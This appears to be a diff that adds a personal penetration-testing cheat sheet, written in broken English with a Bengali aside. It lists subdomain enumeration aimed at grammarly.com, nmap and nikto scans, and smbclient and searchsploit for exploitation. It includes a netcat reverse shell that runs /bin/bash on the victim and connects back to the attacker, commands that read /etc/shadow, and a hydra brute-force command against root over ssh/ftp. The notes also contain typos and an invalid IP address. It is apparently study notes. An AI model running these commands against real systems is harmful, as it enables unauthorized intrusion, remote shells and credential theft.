@@ -1,0 +1,52 @@
+                                    subdomain hunting 
+                                    __________________
+theHarvester //best tools for sublist
+sublist3r -d grammarly.com -b all -o grammarly.txt  //sublist3r command 
+crt.sh      // %.example.com // this website help find sub domain
+amss  // also use
+                                Built with technology
+                                ______________________
+builtwith.com        // check website technology
+wapalyzer  //extension or website 
+                               netwok
+                               ______
+netdiscover ip/24     // for subnet scan
+after we use nmap for 3-wayhand shak //mame -sS meanig stealth scan
+nmap -v -T4/T1/T5/ -p- -A -V i p
+nikto -h ip or website
+gobuster/dirbuster/dirb/burpsuite 
+
+after finding open port ,your need to exploit .
+know we are discuss exploit 
+
+
+                                    exploition
+                                    __________
+smbclient -L \\ip\\    -> eta deye smb login kora jay.
+ssh ip
+searchsploit   -> for vulnerality
+
+                                scanning
+                                ________
+nessus tools for vulnerality asignment 
+zaproxy kali tools use automatic scan
+nc nvlp 4444 -> (my macheine)
+nc 192.168.9.0.1 80 -e /bin/bash ->( client site)
+metaexploit
+openLuck (this is use for apache vulnerabality) git repository
+after connecting rce : you will give blew this command
+ifconfig
+arp
+route
+sudo -l 
+cat /etc/passwd
+cat /etc/shadow
+
+                            bruteForce
+                            __________
+
+hydra // hyra -h you see example commad 
+hydra -l root -P /usr/share/metaexploit/password.txt (ftp/ssh)ip:port -t 4 -V //you use any passwordlist like metaexploit password list ,dib pass list and so more.
+
+ 
+
